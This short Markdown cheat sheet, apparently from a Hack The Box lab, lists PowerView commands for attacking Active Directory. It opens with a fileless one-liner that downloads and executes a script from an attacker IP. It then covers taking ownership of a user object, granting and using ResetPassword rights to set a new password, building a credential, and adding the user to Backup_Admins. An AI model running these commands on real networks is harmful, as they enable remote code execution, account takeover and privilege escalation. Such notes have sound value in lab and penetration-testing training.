# PowerView.ps1

## Fileless (Running PS1 without saving to disk)
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
```

## Take Ownership over User
- Prerequisite is to have PowerView loaded

```
Set-DomainObjectOwner -Identity Herman -OwnerIdentity Nico
```

## Reset Password
- Prerequisite is to have PowerView loaded

```
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity Nico -Rights ResetPassword -Verbose
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
```

## Build New Credential
```
$user = 'htb\herman'
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
```

## Add user to group
```
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
```